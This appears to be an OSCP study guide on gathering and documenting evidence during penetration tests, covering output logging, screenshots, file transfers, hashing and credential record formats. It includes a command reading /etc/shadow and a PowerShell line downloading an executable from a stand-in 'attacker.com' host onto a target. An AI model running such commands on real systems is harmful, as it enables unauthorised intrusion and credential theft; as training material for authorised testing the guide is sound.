# Proof Collection for OSCP

Collecting proper proof is essential for validating your findings and demonstrating successful exploitation. This guide covers best practices for gathering and documenting evidence during your OSCP exam and penetration tests.

## 📋 Table of Contents
1. [Types of Proof](#types-of-proof)
2. [Command Output](#command-output)
3. [Screenshots](#screenshots)
4. [File Transfers](#file-transfers)
5. [Hashes and Credentials](#hashes-and-credentials)
6. [Tools](#-tools)
7. [Practice](#-practice)

## Types of Proof

### Required Evidence
1. **Initial Access**
   - Exploit used
   - Command output showing successful execution
   - Initial shell access

2. **Privilege Escalation**
   - Before and after privilege levels
   - Exploit or misconfiguration details
   - Command output showing successful escalation

3. **Flags/Proof Files**
   - Contents of proof.txt or flag files
   - File hashes
   - Timestamp of access

### Proof of Concept (PoC)
- **Vulnerability Verification**: Show the vulnerability exists
- **Exploitation**: Demonstrate successful exploitation
- **Impact**: Show the potential impact

## Command Output

### Saving Output
```bash
# Save command output to file
command > output.txt 2>&1

# Append to existing file
command >> all_output.txt 2>&1

# Timestamp commands
echo "=== $(date) ===" >> notes.txt
command >> notes.txt 2>&1
```

### Important Commands to Document
```bash
# System information
uname -a
hostname
id
whoami

# Network information
ifconfig/ip a
netstat -tuln
route -n

# User information
cat /etc/passwd
cat /etc/shadow
sudo -l

# Process information
ps aux
top -n 1
```

## Screenshots

### Best Practices
1. **Be Selective**: Only capture relevant portions
2. **Highlight**: Use boxes or arrows to point out important details
3. **Annotate**: Add text descriptions
4. **Redact**: Remove sensitive information
5. **Organize**: Number and label screenshots logically

### Screenshot Tools
```bash
# Linux
import -window root screenshot.png
scrot -s -d 1 -e 'mv $f ~/screenshots/'

# Windows
# Snipping Tool or Print Screen

# Cross-platform (with GUI)
# Flameshot, Greenshot
```

## File Transfers

### Transferring Files
```bash
# Python HTTP server
python3 -m http.server 80

# SCP (from attacker)
scp file.txt user@target:/path/

# Windows (PowerShell)
Invoke-WebRequest -Uri http://attacker.com/file.exe -OutFile C:\\Windows\\Temp\\file.exe
```

### Verifying File Integrity
```bash
# Calculate hashes
md5sum file
sha1sum file
sha256sum file

# Verify downloaded files
certutil -hashfile file.exe SHA256
```

## Hashes and Credentials

### Documenting Credentials
```
# Format
Service: [Service Name]
URL/Host: [Target]
Username: [Username]
Password: [Password]
Notes: [Additional info]
```

### Password Hashes
```
# Format
Username: [Username]
LM Hash: [Hash]
NTLM Hash: [Hash]
```

## 🛠 Tools

### Evidence Collection
- **KeepNote**: Organized note-taking
- **CherryTree**: Hierarchical notes with formatting
- **Dradis**: Collaborative reporting
- **OneNote**: Microsoft's note-taking solution

### File Transfer
- **Python HTTP Server**: Quick file sharing
- **SCP**: Secure file copy
- **PowerShell**: Built-in file transfer
- **Netcat**: Raw data transfer

### Hashing
- **md5sum/sha1sum**: Linux hash utilities
- **certutil**: Windows hash utility
- **Get-FileHash**: PowerShell hashing

## 📚 Resources
- [Offensive Security Exam Guide](https://help.offensive-security.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
- [Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [NIST Guide to Test, Training, and Exercise Programs](https://csrc.nist.gov/publications/detail/sp/800-84/final)

## 🎯 Practice
1. Practice taking screenshots of key steps during lab exercises
2. Document your methodology and commands used
3. Create sample reports with your evidence
4. Verify all evidence is clear and supports your findings

## ⚠️ Legal Note
Only collect evidence from systems you own or have explicit permission to test. Always follow responsible disclosure practices and respect confidentiality agreements.
